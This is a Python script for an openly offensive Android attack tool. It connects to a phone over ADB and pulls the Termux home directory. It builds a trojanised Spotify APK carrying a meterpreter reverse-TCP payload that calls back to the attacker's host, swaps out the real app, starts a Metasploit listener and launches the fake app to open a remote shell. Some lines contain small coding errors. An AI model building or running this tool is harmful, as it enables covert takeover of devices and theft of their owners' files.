import os
import sys
import socket
import requests
import time
from termcolor import colored
import get_ip as ad
def msf():
    print(colored("[*]creating virus","blue"))
    time.sleep(5)
    print(colored("[*]connecting to msf","blue"))
    os.system("msfvenom -p android/meterpreter/reverse_tcp -x spotify.apk LHOST=%s LPORT=4444 -f java -o trojan_spotify.apk" % ad.get(socket.gethostname()))
    


def andro(ip, port):
    try:
        print(colored("[*]connecting to %s" % ip, "blue"))
        os.system(" adb connect %s:%s" % ip, port)
        print(colored("[+]connected to %s" % ip, "green"))
        time.sleep(1)
        print(colored("[*]pulling termux files","blue"))
        os.system(" adb pull /data/data/com.termux/files/home/")
        print(colored("[+]pulled termux files","green"))
        time.sleep(1)
        msf()
        print(colored("do you want to install a reverse shell? (y/n)\n", "blue"))
        
        choice = input()
        if choice == "y":
            os.system(" adb uninstall com.spotify.music")
            os.system(" adb install trojan_spotify.apk")
            print(colored("[+]]installed false_spotify","green"))
            os.system("msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST %s; set LPORT 4444; set ExitOnSession false; exploit;' " % ad.get(socket.gethostname()))
            print(colored("[+]connected to msf","green"))
            print(colored("[*]executing false_spotify","blue"))
            try:
                os.system(" adb shell am start -n com.spotify.music/com.spotify.music.MainActivity")
                print(colored("[+]executed false_spotify","green"))
            except Exception as e:
                print(colored("[-]An error has occured\n\n", e, "returning to main menu....", "red"))
                time.sleep(1)
                return False
            print(colored("[+]executing msf","blue"))

            return True
        if choice == "n":
            print(colored("[-]exiting","red"))
            return False
        else:
            print(colored("[-]invalid choice","red"))
        
    except:
        print(colored("[-]failed to connect to %s" % ip, "red"))

    
